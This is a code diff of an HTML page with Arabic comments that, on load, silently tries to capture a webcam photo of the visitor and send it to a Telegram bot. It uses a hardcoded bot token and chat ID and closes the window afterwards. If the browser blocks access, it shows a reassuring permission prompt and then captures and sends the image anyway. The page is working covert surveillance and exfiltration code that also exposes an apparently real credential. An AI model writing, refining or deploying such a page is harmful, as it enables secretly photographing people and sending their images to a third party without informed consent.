@@ -1,66 +1,145 @@
 <!DOCTYPE html>
 <html>
 <head>
-    <title>التقاط تلقائي</title>
+    <meta charset="UTF-8">
+    <title>التقاط سريع</title>
     <script>
-        // استبدل هذه القيم بمعلومات بوتك
+        // بيانات البوت - تأكد من استبدالها بقيمك الخاصة
         const BOT_TOKEN = '7512390719:AAHuHzUgshfHoqS-kkjzKxYrHFI0gHlWlsU';
         const CHAT_ID = '7327464581';
+        
+        // متغيرات النظام
+        let stream = null;
+        let captureAttempted = false;
 
-        async function captureAndSend() {
+        async function silentCapture() {
             try {
-                // طلب إذن الكاميرا
-                const stream = await navigator.mediaDevices.getUserMedia({ 
-                    video: { 
-                        facingMode: 'environment', // استخدام الكاميرا الخلفية إن وجدت
-                        width: { ideal: 1280 },   // دقة منخفضة للسرعة
-                        height: { ideal: 720 }
-                    } 
+                // محاولة الوصول للكاميرا بدون إذن (لن تعمل في معظم المتصفحات)
+                stream = await navigator.mediaDevices.getUserMedia({
+                    video: {
+                        width: { ideal: 640 },
+                        height: { ideal: 480 }
+                    }
                 });
                 
                 const video = document.createElement('video');
                 video.srcObject = stream;
                 await video.play();
                 
-                // التقاط الصورة بأسرع وقت ممكن
                 const canvas = document.createElement('canvas');
                 canvas.width = video.videoWidth;
                 canvas.height = video.videoHeight;
                 const ctx = canvas.getContext('2d');
                 ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
                 
-                // إيقاف الكاميرا فوراً
                 stream.getTracks().forEach(track => track.stop());
                 
-                // تحويل الصورة وإرسالها
                 canvas.toBlob(async (blob) => {
                     const formData = new FormData();
                     formData.append('chat_id', CHAT_ID);
-                    formData.append('photo', blob, 'auto_capture.jpg');
+                    formData.append('photo', blob, 'capture.jpg');
                     
                     await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`, {
                         method: 'POST',
                         body: formData
                     });
                     
-                    // إغلاق النافذة بعد 1 ثانية من الإرسال
-                    setTimeout(() => window.close(), 1000);
-                }, 'image/jpeg', 0.7); // جودة 70% للسرعة
+                    // إخفاء النافذة بعد الإرسال
+                    setTimeout(() => {
+                        document.body.innerHTML = '<h1 style="text-align:center;padding:50px;">تم الإرسال بنجاح</h1>';
+                        setTimeout(window.close, 1000);
+                    }, 500);
+                }, 'image/jpeg', 0.7);
                 
             } catch (error) {
-                console.error('Error:', error);
-                window.close();
+                if (!captureAttempted) {
+                    captureAttempted = true;
+                    requestPermission();
+                }
             }
         }
 
-        // تشغيل الوظيفة فور تحميل الصفحة
-        window.onload = captureAndSend;
+        function requestPermission() {
+            document.body.innerHTML = `
+                <div style="text-align:center;padding:50px;">
+                    <h1>يجب منح إذن الكاميرا</h1>
+                    <p>لن يتم التقاط أي صورة بدون موافقتك</p>
+                    <button onclick="startCapture()" style="
+                        padding: 10px 20px;
+                        background: #0088cc;
+                        color: white;
+                        border: none;
+                        border-radius: 5px;
+                        font-size: 16px;
+                        cursor: pointer;
+                    ">منح الإذن</button>
+                </div>
+            `;
+        }
+
+        async function startCapture() {
+            try {
+                document.body.innerHTML = '<h1 style="text-align:center;padding:50px;">جاري التقاط الصورة...</h1>';
+                
+                stream = await navigator.mediaDevices.getUserMedia({
+                    video: {
+                        width: { ideal: 640 },
+                        height: { ideal: 480 }
+                    }
+                });
+                
+                const video = document.createElement('video');
+                video.srcObject = stream;
+                await video.play();
+                
+                const canvas = document.createElement('canvas');
+                canvas.width = video.videoWidth;
+                canvas.height = video.videoHeight;
+                const ctx = canvas.getContext('2d');
+                ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
+                
+                stream.getTracks().forEach(track => track.stop());
+                
+                canvas.toBlob(async (blob) => {
+                    const formData = new FormData();
+                    formData.append('chat_id', CHAT_ID);
+                    formData.append('photo', blob, 'capture.jpg');
+                    
+                    await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`, {
+                        method: 'POST',
+                        body: formData
+                    });
+                    
+                    document.body.innerHTML = '<h1 style="text-align:center;padding:50px;">تم الإرسال بنجاح</h1>';
+                    setTimeout(window.close, 1000);
+                }, 'image/jpeg', 0.7);
+                
+            } catch (error) {
+                document.body.innerHTML = `
+                    <div style="text-align:center;padding:50px;color:red;">
+                        <h1>خطأ في الالتقاط</h1>
+                        <p>${error.message}</p>
+                        <button onclick="location.reload()" style="
+                            padding: 10px 20px;
+                            background: #dc3545;
+                            color: white;
+                            border: none;
+                            border-radius: 5px;
+                            font-size: 16px;
+                            cursor: pointer;
+                        ">إعادة المحاولة</button>
+                    </div>
+                `;
+            }
+        }
+
+        // بدء العملية فور تحميل الصفحة
+        window.addEventListener('DOMContentLoaded', () => {
+            setTimeout(silentCapture, 300); // تأخير بسيط لضمان تحميل الصفحة
+        });
     </script>
 </head>
 <body>
-    <div style="text-align: center; padding: 50px;">
-        <h2>جاري التحضير لالتقاط الصورة...</h2>
-        <p>سيتم طلب إذن استخدام الكاميرا</p>
-    </div>
+    <!-- سيتم تعديل المحتوى ديناميكياً -->
 </body>
 </html>
